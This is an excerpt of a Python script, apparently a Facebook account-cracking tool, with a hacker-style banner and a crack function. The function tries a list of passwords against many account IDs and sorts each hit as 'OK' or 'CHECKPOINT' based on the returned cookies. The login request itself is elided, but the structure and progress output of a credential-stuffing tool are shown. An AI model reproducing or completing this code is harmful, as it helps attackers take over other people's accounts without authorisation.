...
def banner():
 ...
 \ \ /\ / / / __| '_ \  | '_ ` _ \ / _ \ |/ / _` | '__| 
  \ V  V /| \__ \ | | | | | | | | |  __/   < (_| | |    
   \_/\_/ |_|___/_| |_| |_| |_| |_|\___|_|\_\__,_|_|    [•] Mr Nayeem Hassan
 [•] Facebook: wish mekar
 [•] Master Mind🥺❤️                                      '''
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}N4Y66M-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ✨ N4Y66M-CHECKPOINT ✨ [red]'))
				...
				cetak(nel('[green]      ❤️✨ N4Y66M OK ❤️✨[green]')) 
